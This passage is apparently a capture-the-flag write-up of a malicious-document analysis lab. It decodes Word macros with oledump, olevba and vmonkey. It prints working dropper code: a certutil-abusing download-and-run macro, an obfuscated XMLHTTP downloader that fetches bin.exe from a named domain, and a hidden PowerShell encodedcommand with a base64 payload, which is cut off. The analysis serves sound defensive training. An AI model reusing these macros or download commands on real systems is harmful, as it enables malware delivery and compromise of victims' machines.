LG = h("12%2%11%79%64%12%79%77%28%10%27%79%26%82%26%29%3%73%73%12%14%3%3%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%10%23%10%79%64%74%26%74%49%12%49%14%49%12%49%7%49%10%49%79%64%9%49%79%7%27%27%31%85%64%64%87%12%9%14%22%25%65%12%0%2%64%13%0%3%13%64%5%14%10%1%27%65%31%7%31%80%3%82%3%6%26%27%89%65%12%14%13%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%79%73%73%79%12%14%3%3%79%29%10%8%28%25%29%92%93%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%77")

Dim XN As New WshShell
Call XN.run("cmd /c set u=tutil&&call copy C:\Windows\System32\cer%u%.exe C:\ProgramData\1.exe", 0)
Call XN.run(LG, 0)

End Sub
```

Q: What program is used to run the executable?

we see cmd /c to set u=tutil and cer%u%.exe which is seemingly crtutil.exe being obfuscated. I went googling and found that this is a LOLBAS trick that abuses certutils copy functionality to drop a renamed binary.

( Uses cmd /c to set u=tutil (so cer%u%.exe becomes certutil.exe), then copies C:\Windows\System32\certutil.exe to C:\ProgramData\1.exe)

A: Certutil


Q: Provide the malicious URI included in the maldoc that was used to download the binary (without http/https).

so we see it runs `cmd /c "set u=url && call C:\ProgramData\1.exe /%u% ..."`
`%u%` becomes **url**, meaning the macro passes a remote URL to the copied certutil executable.

The downloaded file is written to ``C:\ProgramData\1.tmp``

and then the macro  runs the downloaded file. 

So the macro is storing the obfuscated string:
```text
12%2%11%79%64%12%79%77%28%10%27%79%26%82%26%29%3%73%73%12%14%3%3%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%10%23%10%79%64%74%26%74%49%12%49%14%49%12%49%7%49%10%49%79%64%9%49%79%7%27%27%31%85%64%64%87%12%9%14%22%25%65%12%0%2%64%13%0%3%13%64%5%14%10%1%27%65%31%7%31%80%3%82%3%6%26%27%89%65%12%14%13%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%79%73%73%79%12%14%3%3%79%29%10%8%28%25%29%92%93%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%77
```
(a list of raw byte values in decimal separated by %)

The h function in the doc is
```text
Function h(ju)
  eR = Split(ju, "%")
  For lc = 0 To UBound(eR)
    hh = hh & Chr(eR(lc) Xor 111)
  Next lc
  h = hh
End Function
```

That means:  
• split the big string on `%` into numbers,  
• XOR each number with 111,  
• convert the result to a character, and concatenate.

(Note: this can be found easier by running `vmonkey attacker3.doc` to emulate the macro running)

A: 8cfayv.com/bolb/jaent.php?l=liut6.cab

Q: What folder does the binary gets dropped in?

A: ProgramData

Q: Which stream executes the binary that was downloaded?

A: A3

# Attacker 4

You are very close to the finish line, but the Attacker 4 is still standing in your way. Don't let him win!

```shell
 oledump.py attacker4.doc 

```

```text
  1:       113 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      4096 '1Table'
  5:       438 'Macros/PROJECT'
  6:        41 'Macros/PROJECTwm'
  7: M   17216 'Macros/VBA/ThisDocument'
  8:     10917 'Macros/VBA/_VBA_PROJECT'
  9:       515 'Macros/VBA/dir'
 10:      4142 'WordDocument'

```


```shell
olevba attacker4.doc
```

```text
===============================================================================
FILE: attacker4.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: attacker4.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Function Hextostring(ByVal LIfBaRNaq As String) As String
Dim bOYvqTVCQck As String
Dim FNOMR As String
Dim wDhutJNQ As Long
For wDhutJNQ = 1 To Len(LIfBaRNaq) Step 2
If 128918 = 128918 + 1 Then End
If 3786 < 26 Then
If 751819 = 751819 + 1 Then End
If 3264 < 68 Then
        MsgBox ("uQQmbkpk91")
End If
If Len("gCUNhpmZ4478") = Len("AfkPTCKQ") Then
       MsgBox ("Error !!!")
End If
        MsgBox ("HplLmocL88")

End If
If Len("gnJhlPff4992") = Len("izYUCJCG") Then
If 453232 = 453232 + 1 Then End
If 2346 < 12 Then
        MsgBox ("tZGiCmps23")
End If
If Len("prksphdB3552") = Len("eRyRFxWn") Then
       MsgBox ("Error !!!")
End If
       MsgBox ("Error !!!")

End If
If 513385 = 513385 + 1 Then End
If 1788 < 34 Then
        MsgBox ("MdLJUEle65")
End If
If Len("zvFxcxRf2893") = Len("gGbyDpzx") Then
       MsgBox ("Error !!!")
End If
bOYvqTVCQck = Chr$(Val(Chr$(38) & Chr$(72) & Mid$(LIfBaRNaq, wDhutJNQ, 2)))


If 679582 = 679582 + 1 Then End
If 4764 < 49 Then
If 988195 = 988195 + 1 Then End
If 5892 < 13 Then
        MsgBox ("PLjzMDno76")
End If
If Len("opFcKgjZ3694") = Len("zQEGxwNt") Then
       MsgBox ("Error !!!")
End If
        MsgBox ("CLZiRzih72")

End If
If Len("ttcDmMln2566") = Len("kwoxPUHO") Then
If 768811 = 768811 + 1 Then End
If 3344 < 68 Then
        MsgBox ("LlhuNOmN91")
End If
If Len("aTqSHATq1946") = Len("AjrSPany") Then
       MsgBox ("Error !!!")
End If
       MsgBox ("Error !!!")

End If
If 312727 = 312727 + 1 Then End
If 7138 < 44 Then
        MsgBox ("fwJBAgAh17")
End If
If Len("vkytXtMV8243") = Len("kLWxnsEn") Then
       MsgBox ("Error !!!")
End If
FNOMR = FNOMR & bOYvqTVCQck


Next wDhutJNQ
If 729678 = 729678 + 1 Then End
If 3216 < 86 Then
If 794514 = 794514 + 1 Then End
If 3692 < 52 Then
        MsgBox ("rtzipwlx84")
End If
If Len("sjCDNfRU3716") = Len("vUIxhzzH") Then
       MsgBox ("Error !!!")
End If
        MsgBox ("bocnPvMm58")

End If
If Len("CbWCINQG1818") = Len("JaPgdumj") Then
If 749461 = 749461 + 1 Then End
If 6217 < 59 Then
        MsgBox ("clnhRiWt51")
End If
If Len("ZWzmHeVK6323") = Len("wxJSwpUl") Then
       MsgBox ("Error !!!")
End If
       MsgBox ("Error !!!")

End If
If 175442 = 175442 + 1 Then End
If 6491 < 99 Then
        MsgBox ("cLrzZuDD22")
End If
If Len("TtBUlBVV7515") = Len("JwOkIDwu") Then
       MsgBox ("Error !!!")
End If
Hextostring = FNOMR


End Function


Sub Auto_Open()
GoTo hpolxosipwleovqydqiijfmpmhadwhkijvlbokhmrnhlwrcbihvyiwnplgjfltwjtypwmbprbpunfrtvrl:
hpolxosipwleovqydqiijfmpmhadwhkijvlbokhmrnhlwrcbihvyiwnplgjfltwjtypwmbprbpunfrtvrl:
GoTo bfvcjnnjkjkvxctrntfoimlrjeyrtcbdbkdaxpratpwmmiosffuwjoxzowxecewxwdoypivotfbjbuxmul:
bfvcjnnjkjkvxctrntfoimlrjeyrtcbdbkdaxpratpwmmiosffuwjoxzowxecewxwdoypivotfbjbuxmul:
GoTo rkckdqbljfjtdbrryuwatebpsacldejdsschjsuavrcbpilzgevpmjxvcmfuzhozfprtuwyfedvshsetyf:
rkckdqbljfjtdbrryuwatebpsacldejdsschjsuavrcbpilzgevpmjxvcmfuzhozfprtuwyfedvshsetyf:
IOWZJGNTSGK
End Sub
Sub AutoOpen()
GoTo zgjksfckvjbfupbfpqerjkfbyvhphicghmdzwyshljawbwgybalblihqmatttqiaxprnmitiumgzjglrmt:
zgjksfckvjbfupbfpqerjkfbyvhphicghmdzwyshljawbwgybalblihqmatttqiaxprnmitiumgzjglrmt:
GoTo ntkwgbazodnxlmngkssfvjdwvczwjxotblvzzropmwqzxlujflzjpazteectmrbvtqnnnqobmcyydrssnb:
ntkwgbazodnxlmngkssfvjdwvczwjxotblvzzropmwqzxlujflzjpazteectmrbvtqnnnqobmcyydrssnb:
GoTo ocgfmhrsimdpiyclijxwpjopjtlwjtopoyithnuojbvcaauwaavscrmxsabgqvemffbcddzhhdsvmnjfcp:
ocgfmhrsimdpiyclijxwpjopjtlwjtopoyithnuojbvcaauwaavscrmxsabgqvemffbcddzhhdsvmnjfcp:
    Auto_Open
End Sub
Sub Workbook_Open()
GoTo fqugoppeeftaopjzsjmupsrtovfxedfgpecorppweusztfkzphwpfhofwhixfaghbmfkdwnsycrsvjrtly:
fqugoppeeftaopjzsjmupsrtovfxedfgpecorppweusztfkzphwpfhofwhixfaghbmfkdwnsycrsvjrtly:
GoTo heqkginwiaibyfsvwvqtxuitugennjoangyodyfcqziwybtnwvwtibwqomzimszrrprdgguukjywhbuygx:
heqkginwiaibyfsvwvqtxuitugennjoangyodyfcqziwybtnwvwtibwqomzimszrrprdgguukjywhbuygx:
GoTo psjngffkwvmdllnhrcbfqiugmqunvyccxewbrxqhmlfswjoulnrvcmkxsetiqqriaihnzvtulingjhehnf:
psjngffkwvmdllnhrcbfqiugmqunvyccxewbrxqhmlfswjoulnrvcmkxsetiqqriaihnzvtulingjhehnf:
    Auto_Open
End Sub
Function ZUWSBYDOTWV(ByVal FYAMZFQXNVI As String, ByVal CVUDEDVJFST As String) As Boolean
     Dim VPBCRFOQENN As Object, LSFYHUDVCYR As Long, QSBXXUZTKRD As Long, MDLLXOKIXRV() As Byte

GoTo hjwiwiyeojxvawsanclcahyfrfgwjdikfsfnjazxovvouiysjoieyyyjvczcudqpbumdziyyzydjhmvmdd:
hjwiwiyeojxvawsanclcahyfrfgwjdikfsfnjazxovvouiysjoieyyyjvczcudqpbumdziyyzydjhmvmdd:
GoTo xwqdjsttofxtkraaybygbodqkprjcpmjlvvdoqvxaokuluhzjnnpkgyqmwfmtvooihxsiqkaoyssrerysn:
xwqdjsttofxtkraaybygbodqkprjcpmjlvvdoqvxaokuluhzjnnpkgyqmwfmtvooihxsiqkaoyssrerysn:
GoTo brfgzmzrcabwgbcfbtnfmhjqhazwlbtduyyfkhjhmcvjlqrnnuntxcjijgjcqvhnjmfvpgmywngwcdiybg:
brfgzmzrcabwgbcfbtnfmhjqhazwlbtduyyfkhjhmcvjlqrnnuntxcjijgjcqvhnjmfvpgmywngwcdiybg:
    Set VPBCRFOQENN = CreateObject(XORI(Hextostring("3F34193F254049193F253A331522"), Hextostring("7267417269")))
GoTo fpvygztoabfyscyqmjxaakqwiwqpjfzgwplzmhryvptavvsitizcoqgammdhoraqpviudbameizhxxkfiw:
fpvygztoabfyscyqmjxaakqwiwqpjfzgwplzmhryvptavvsitizcoqgammdhoraqpviudbameizhxxkfiw:
GoTo fjuvxpaemzuawljcczrjcqncfqtadadckbfxynawdigwsmxxfdtoiyzyriibnsacdbvkbubskrjrvkujkg:
fjuvxpaemzuawljcczrjcqncfqtadadckbfxynawdigwsmxxfdtoiyzyriibnsacdbvkbubskrjrvkujkg:
GoTo atdgxcypqufobazqwfbzsdpphuexwbgmzrvveuqfuissqnqrjbvmoathximeitkzlsazxqlwrbwkegkczc:
atdgxcypqufobazqwfbzsdpphuexwbgmzrvveuqfuissqnqrjbvmoathximeitkzlsazxqlwrbwkegkczc:
    VPBCRFOQENN.Open XORI(Hextostring("00353B"), Hextostring("47706F634E")), FYAMZFQXNVI, False
GoTo epeseeevnrzyaadmzsevtcsqluqvolrmjnixrzskpndwmoroasnxrummjcspjhcnelodnfpcezpisjevfv:
epeseeevnrzyaadmzsevtcsqluqvolrmjnixrzskpndwmoroasnxrummjcspjhcnelodnfpcezpisjevfv:
GoTo maokmvxjtqtpftqzvdrnngwsapudlcejlbqkuatexahbsfmqoicfoaivfabrltukeprqqvrfpvrejlgeqv:
maokmvxjtqtpftqzvdrnngwsapudlcejlbqkuatexahbsfmqoicfoaivfabrltukeprqqvrfpvrejlgeqv:
GoTo sjxdhcerkhefckeipoiiuyqtxyvinbyqezfovvlmrerfrqsyaywnotmvfernkainkhxraujtcwwztuqtrk:
sjxdhcerkhefckeipoiiuyqtxyvinbyqezfovvlmrerfrqsyaywnotmvfernkainkhxraujtcwwztuqtrk:
    VPBCRFOQENN.Send XORI(Hextostring("2B0F25162232"), Hextostring("4C596D54"))


GoTo gvmsrorblqfnrjolulwwxmxgvzmrtfbbfaljljudjhbbxnovjreufhyrdxpzrsvoxlooybzlkvwnadubpr:
gvmsrorblqfnrjolulwwxmxgvzmrtfbbfaljljudjhbbxnovjreufhyrdxpzrsvoxlooybzlkvwnadubpr:
GoTo vkgymmqtvhsqigckerbehvgndmtviptwxefqeovgkmdywdtsxwgeztwteajsmnvgovickubtbjojchvavr:
vkgymmqtvhsqigckerbehvgndmtviptwxefqeovgkmdywdtsxwgeztwteajsmnvgovickubtbjojchvavr:
GoTo eefacwluvdsabkxksygzskpgnyxphqvqmjvybamguztrddgzxprzrdeiyiuhbpgfwrexfqimxjosfotycl:
eefacwluvdsabkxksygzskpgnyxphqvqmjvybamguztrddgzxprzrdeiyiuhbpgfwrexfqimxjosfotycl:
    MDLLXOKIXRV = VPBCRFOQENN.responseBody

GoTo oyvsqgqcyuwgtctubxrljpltcezjxtssqvblihttgpkbfekrxowacmwewceoaqxhdlotlqoquuaksqlcth:
oyvsqgqcyuwgtctubxrljpltcezjxtssqvblihttgpkbfekrxowacmwewceoaqxhdlotlqoquuaksqlcth:
GoTo dzhmmxhnfrasicvjjpseprigmeolanldvlihpwgoksljzgwoycrcitvhcaybislwhylvedsxyelioervvj:
dzhmmxhnfrasicvjjpseprigmeolanldvlihpwgoksljzgwoycrcitvhcaybislwhylvedsxyelioervvj:
GoTo isegyhulplxjpkfaqzstfxaboybyprklnkwzxoixqdexvibqjqqfvntdpjwopldzhmffbvvdvydebthefj:
isegyhulplxjpkfaqzstfxaboybyprklnkwzxoixqdexvibqjqqfvntdpjwopldzhmffbvvdvydebthefj:
    QSBXXUZTKRD = FreeFile
    Open CVUDEDVJFST For Binary As #QSBXXUZTKRD
    Put #QSBXXUZTKRD, , MDLLXOKIXRV
    Close #QSBXXUZTKRD
GoTo vdpicaomrghrizweyaaozmrwyiyrubxpytxwqedttfneypyxmwzolrkvrghzhcpvdovereglnjrdohqryu:
vdpicaomrghrizweyaaozmrwyiyrubxpytxwqedttfneypyxmwzolrkvrghzhcpvdovereglnjrdohqryu:
GoTo ngtplnbnislqtghybuwictiwrbvoddltxhtemlrbrltdyrcmoszexgadznluscjfpehkuhcvoouwavrtwv:
ngtplnbnislqtghybuwictiwrbvoddltxhtemlrbrltdyrcmoszexgadznluscjfpehkuhcvoouwavrtwv:
GoTo gwjszpofcnutwsbxmljtbuzrblemslyuiwjsilpkqhgvdmwohdyzopbtepgmqesyglpmmnbkpqghntgsfd:
gwjszpofcnutwsbxmljtbuzrblemslyuiwjsilpkqhgvdmwohdyzopbtepgmqesyglpmmnbkpqghntgsfd:
    
GoTo byxsxnpghvnbvkrgcuhsgztkersubfntrrmtrcjdbemqbhuvetdyllrakpcaukdktlpyupnzytvynwldzz:
byxsxnpghvnbvkrgcuhsgztkersubfntrrmtrcjdbemqbhuvetdyllrakpcaukdktlpyupnzytvynwldzz:
GoTo cckqxskeypruwnmoemiyeejgtzmqhaaonszuqrucwwvahggyylevwcjiupfyjzqhzrvsrrqfpbsqtkaohq:
cckqxskeypruwnmoemiyeejgtzmqhaaonszuqrucwwvahggyylevwcjiupfyjzqhzrvsrrqfpbsqtkaohq:
GoTo rwxumqulzygtqkrwzfbqwfewutedetjeriydgckahepjhxcpztzzrnpepyfrngvfbxztxgufoefihmlxut:
rwxumqulzygtqkrwzfbqwfewutedetjeriydgckahepjhxcpztzzrnpepyfrngvfbxztxgufoefihmlxut:
Set hBBkbmop6VHJL = CreateObject(XORI(Hextostring("020A271C3D4C0300210E2B1330162B1F3F"), Hextostring("51624270")))
GoTo zlbrmdtmprviueydvnhzltntlvfofmkntrjatbzfuxavnqxeasqawcqlnddunpozvflosmyvmvfrlwvkcw:
zlbrmdtmprviueydvnhzltntlvfofmkntrjatbzfuxavnqxeasqawcqlnddunpozvflosmyvmvfrlwvkcw:
GoTo cymkgaghrqzskhomptqembbmdowhzswsilmqxztokhksqucilnmcqlplntosnjpwpiizppkjdeaxupsqbc:
cymkgaghrqzskhomptqembbmdowhzswsilmqxztokhksqucilnmcqlplntosnjpwpiizppkjdeaxupsqbc:
GoTo sbawlclojhxparpakhmfucvtwinbxhjqqozqdofgmqiejtkkykqfzphrenmsqwmjekdxoeetrjwuemxnbh:
sbawlclojhxparpakhmfucvtwinbxhjqqozqdofgmqiejtkkykqfzphrenmsqwmjekdxoeetrjwuemxnbh:
hBBkbmop6VHJL.Open Environ(XORI(Hextostring("3C3F3A03"), Hextostring("687A7753"))) & XORI(Hextostring("1217092B0F0718371F1F133560362807"), Hextostring("4E535062"))
GoTo zhbgddcmjsnilsugiepwecwcxltbxbjufbtgufsdjvftrhkrentmbfezatdpzztqsssichtcptvblraaxs:
zhbgddcmjsnilsugiepwecwcxltbxbjufbtgufsdjvftrhkrentmbfezatdpzztqsssichtcptvblraaxs:
GoTo iipgxjxthbjxifqrzxbojqmgpfqahonaeikufzxmtdozgioggaekervfdgvbuzkoumgelbasjdvpcmzutc:
iipgxjxthbjxifqrzxbojqmgpfqahonaeikufzxmtdozgioggaekervfdgvbuzkoumgelbasjdvpcmzutc:
GoTo zygtufihxcugogvxuetvxslpzbpcunbycgmjdickpmuxxndqhwvswlbiulydkhltbnyncpizuqgsjmcidn:
zygtufihxcugogvxuetvxslpzbpcunbycgmjdickpmuxxndqhwvswlbiulydkhltbnyncpizuqgsjmcidn:
     
End Function
Sub IOWZJGNTSGK()
gGHBkj = XORI(Hextostring("1C3B2404757F5B2826593D3F00277E102A7F1E3C7F16263E5A2A2811"), Hextostring("744F50"))
GoTo vswgmmnoquqmdzdukyxjdchijuhbcdgxsbrnikwqdcfhiwhzbjaoqluoidzajkwvumggfhftcrnozygzlx:
vswgmmnoquqmdzdukyxjdchijuhbcdgxsbrnikwqdcfhiwhzbjaoqluoidzajkwvumggfhftcrnozygzlx:
GoTo eqowyelsbrffhhlqqucltfylnpeftufafvjrzyvtgvjpzvpeyxbayzjytlyclyghuqmwumbcduprmiblyx:
eqowyelsbrffhhlqqucltfylnpeftufafvjrzyvtgvjpzvpeyxbayzjytlyclyghuqmwumbcduprmiblyx:
GoTo ruzhzqmkplaybaejhgnsgttcpypofokfkpmcawosbktnfsxibprcykuytpgkldhvrbktjpihhfuxhbdqoh:
ruzhzqmkplaybaejhgnsgttcpypofokfkpmcawosbktnfsxibprcykuytpgkldhvrbktjpihhfuxhbdqoh:
    ZUWSBYDOTWV gGHBkj, Environ(XORI(Hextostring("3E200501"), Hextostring("6A654851714A64"))) & XORI(Hextostring("11371B0A00123918220E001668143516"), Hextostring("4D734243414671"))
End Sub

Public Function XORI(ByVal pThgwA As String, ByVal uTjbLtvPsxK As String) As String
Dim qDrdEbaBjAmrQrC As Long
If 197974 = 197974 + 1 Then End
If 5669 < 12 Then

Dim rrsqtvVn As Integer
rrsqtvVn = 1
Do While rrsqtvVn < 83
DoEvents: rrsqtvVn = rrsqtvVn + 1
Loop

        MsgBox ("vBNHchZL92")
End If
If Len("GoACvBKz6529") = Len("jDtqUckI") Then

Dim ZsaeMBSl As Integer
ZsaeMBSl = 6
Do While ZsaeMBSl < 96
DoEvents: ZsaeMBSl = ZsaeMBSl + 1
Loop

       MsgBox ("Error !!!")
End If

Dim llWAooaJ As Integer
llWAooaJ = 4
Do While llWAooaJ < 77
DoEvents: llWAooaJ = llWAooaJ + 1
Loop

For qDrdEbaBjAmrQrC = 1 To Len(pThgwA)

If 953497 = 953497 + 1 Then End
If 6383 < 67 Then

Dim tMzCjwqZ As Integer
tMzCjwqZ = 2
Do While tMzCjwqZ < 53
DoEvents: tMzCjwqZ = tMzCjwqZ + 1
Loop

        MsgBox ("IlZTqywD49")
End If
If Len("CLQsIKEv7233") = Len("JspJACJS") Then

Dim HUocoJtv As Integer
HUocoJtv = 8
Do While HUocoJtv < 68
DoEvents: HUocoJtv = HUocoJtv + 1
Loop

       MsgBox ("Error !!!")
End If

Dim qqtGMmtg As Integer
qqtGMmtg = 3
Do While qqtGMmtg < 94
DoEvents: qqtGMmtg = qqtGMmtg + 1
Loop

XORI = XORI & Chr(Asc(Mid(uTjbLtvPsxK, IIf(qDrdEbaBjAmrQrC Mod Len(uTjbLtvPsxK) <> 0, qDrdEbaBjAmrQrC Mod Len(uTjbLtvPsxK), Len(uTjbLtvPsxK)), 1)) Xor Asc(Mid(pThgwA, qDrdEbaBjAmrQrC, 1)))

Next qDrdEbaBjAmrQrC
End Function


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|rgAri               |7267417269                                   |
|Hex String|GpocN               |47706F634E                                   |
|Hex String|LYmT                |4C596D54                                     |
|Hex String|QbBp                |51624270                                     |
|Hex String|hzwS                |687A7753                                     |
|Hex String|NSPb                |4E535062                                     |
|Hex String|jeHQqJd             |6A654851714A64                               |
|Hex String|MsBCAFq             |4D734243414671                               |
+----------+--------------------+---------------------------------------------+
```

Q: Provide the first decoded string found in this maldoc.

To do this we must examine the `HexToString` expressions found in the code.

this is the first one

```text
CreateObject(XORI(Hextostring("3F34193F254049193F253A331522"), Hextostring("7267417269")))
```

we can use from hex and XOR (w/ key 7267417269) on cyberchef to decode this

SS13

The output is 

```text
MSXML2.XMLHTTP
```

A: MSXML2.XMLHTTP

Q: Provide the name of the binary being dropped.

To do this, we take the Sub IOWZJGNTSGK() function and the two XORIs
```text
Environ(XORI(Hextostring("3E200501"), Hextostring("6A654851714A64"))) & XORI(Hextostring("11371B0A00123918220E001668143516"), Hextostring("4D734243414671"))
```

Decode these in the same way as above 

SS14

SS15

A: `\DYIATHUQLCW.exe`

Q: Provide the folder where the binary is being dropped to.

A: TEMP

(from the same thing)

Q: Provide the name of the second binary.

```text
Sub IOWZJGNTSGK()
gGHBkj = XORI(Hextostring("1C3B2404757F5B2826593D3F00277E102A7F1E3C7F16263E5A2A2811"), Hextostring("744F50"))
GoTo vswgmmnoquqmdzdukyxjdchijuhbcdgxsbrnikwqdcfhiwhzbjaoqluoidzajkwvumggfhftcrnozygzlx:
vswgmmnoquqmdzdukyxjdchijuhbcdgxsbrnikwqdcfhiwhzbjaoqluoidzajkwvumggfhftcrnozygzlx:
GoTo eqowyelsbrffhhlqqucltfylnpeftufafvjrzyvtgvjpzvpeyxbayzjytlyclyghuqmwumbcduprmiblyx:
eqowyelsbrffhhlqqucltfylnpeftufafvjrzyvtgvjpzvpeyxbayzjytlyclyghuqmwumbcduprmiblyx:
GoTo ruzhzqmkplaybaejhgnsgttcpypofokfkpmcawosbktnfsxibprcykuytpgkldhvrbktjpihhfuxhbdqoh:
ruzhzqmkplaybaejhgnsgttcpypofokfkpmcawosbktnfsxibprcykuytpgkldhvrbktjpihhfuxhbdqoh:
    ZUWSBYDOTWV gGHBkj, Environ(XORI(Hextostring("3E200501"), Hextostring("6A654851714A64"))) & XORI(Hextostring("11371B0A00123918220E001668143516"), Hextostring("4D734243414671"))
End Sub
```

If we consider the entirety of this function and decode these we can find the answer 

SS16

A: bin.exe

Q: Provide the full URI from which the second binary was downloaded (exclude http/https).

A: `gv-roth.de/js/bin.exe`

# Attacker 5

Congratulations, my friend! You have made it to the final stage. Remember to use your brain, not your fists, to defeat **Attacker 5.**

```shell
oledump.py attacker5.doc 
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7157 '1Table'
  5:        97 'Macros/CatchMeIfYouCan/\x01CompObj'
  6:       313 'Macros/CatchMeIfYouCan/\x03VBFrame'
  7:      7566 'Macros/CatchMeIfYouCan/f'
  8:        84 'Macros/CatchMeIfYouCan/o'
  9:       557 'Macros/PROJECT'
 10:       113 'Macros/PROJECTwm'
 11: M    1473 'Macros/VBA/CatchMeIfYouCan'
 12: M     994 'Macros/VBA/Module1'
 13: m     924 'Macros/VBA/ThisDocument'
 14:      3394 'Macros/VBA/_VBA_PROJECT'
 15:       889 'Macros/VBA/dir'
 16:      4096 'WordDocument
```

Had to run through dumping every stream starting from 1 to find the caption:

```shell
oledump.py -s 6 attacker5.doc -S
```

```text
Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} CatchMeIfYouCan 
   Caption         =   "CobaltStrikeIsEverywhere"
   ClientHeight    =   3015
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   4560
   StartUpPosition =   1  'CenterOwner
   TypeInfoVer     =   2

```


Lets use vmonkey on the code

```shell
vmonkey attacker5.doc
```

```text
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file:  - OLE stream: u'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file:  - OLE stream: u'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-------------------------------------------------------------------------------
VBA CODE (with long lines collapsed):
Sub AutoOpen()
    Shell "powershell -nop -w hidden -encodedcommand " & CatchMeIfYouCan.SquidGame.ControlTipText
End Sub
-------------------------------------------------------------------------------
PARSING VBA CODE:
INFO     parsed Sub AutoOpen (): 1 statement(s)
-------------------------------------------------------------------------------
VBA MACRO CatchMeIfYouCan.frm 
in file:  - OLE stream: u'Macros/VBA/CatchMeIfYouCan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-------------------------------------------------------------------------------
VBA CODE (with long lines collapsed):
Private Sub SquidGame_Click()

End Sub

Private Sub CatchMeIfYouCan_Click()

End Sub
-------------------------------------------------------------------------------
PARSING VBA CODE:
INFO     parsed Sub SquidGame_Click (): 0 statement(s)
INFO     parsed Sub CatchMeIfYouCan_Click (): 0 statement(s)
INFO     Reading document variables...
INFO     Reading document comments...
INFO     Reading Shapes object text fields...
INFO     Reading InlineShapes object text fields...
INFO     Reading TextBox and RichEdit object text fields...
INFO     Reading custom document properties...
INFO     Reading embedded object text fields...
INFO     Reading document text and tables...
Traceback (most recent call last):
  File "/opt/vipermonkey/lib/python2.7/site-packages/vipermonkey/core/../export_doc_text.py", line 20, in <module>
    from unotools import Socket, connect
ModuleNotFoundError: No module named 'unotools'
ERROR    Running export_doc_text.py failed. Command '['timeout', '30', 'python3', '/opt/vipermonkey/lib/python2.7/site-packages/vipermonkey/core/../export_doc_text.py', '--text', '-f', '/tmp/tmp_word_file_986530275']' returned non-zero exit status 1
INFO     Reading form variables...

-------------------------------------------------------------------------------
TRACING VBA CODE (entrypoint = Auto*):
INFO     Found possible intermediate IOC (base64): 'JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWABiAFgATwBpAHkAaABMACsASABIADgARgBIADEASwBsAGwAcwBhAGcAcQBJAGwANwBhADYAcwBPAEsAQwBnAHEAKwBJAEoAdgBNAFMAZQBWAEcAbQBCAFEAbABIAGMARwBrAEoAegBkAC8AMwA0AGEAMQBKAHoAcwAzAGUAeQA5AFcAMwBXAHYAVgBaAFQARABUAEgAZABQADkAOQBQAFAAOQBEAFEASwBKAG4AYwBLAEMAVQB5AE4AUwBLADYATwBxAGIAcwBWAEQAawBMAFQAZABhAGgARwBvAFgARABiAGMAMABWAEMAZgBhAFgAKwBLAEIAYQBNAHkATgBGAEkATgBwADAATgBYAG4AZQBZAHYASABxAEIAcQA3ADAAaQBYAFEAOQB3AEcARgBKAC8ARgBXADYAbQBLAEUAQQAyAFYAYgBxAE4AVQBmAEIAcQB1ADMAcABrADQAUwBxAFYAdgAyAFMAQwBXAEkAOABDAFgATAA2ADUASwBkAHoAawBVADUARQBUAEkAZwBPAC8ATwBvAGkAWQBNAFgANgAxAE0AZABtADcAZQBnAGcAYgBsAFoANQBaAHoAKwB1ADUATgBqAEsAZABsAHkAOQBmAHUAbABFAFEAWQBJAGUAYwAzADIAdAA5AFQATgBnAHcAeABMAFoAcQBtAFQAZwBzAGwAYQBsAHYAMQBIAHEAUABBADMAdwAzAFUAUQA5AFkASQA5AFIAZgAxAE8AMQByAHIAVwArADUASwByAEkAdQBZAG0AawBYAGEAWABzAEkAaQBIAFgAMABiAEcAMwBzAGEAaQBpAEwAbwBLAFoANABsAGsAbABLAHgAVAAvAC8ATABKAGEAZgA3ACsAbwB2AE4AZAA2AFAAawBCAFcAVwBpAGsAbwBhAEUAbQB6AFgAZABNAHMAcQBsAHEAbgB2ADUAVwB6AEQAUgBlAHIAaABVAGwARQB5AHQAYwBBAE4AWAB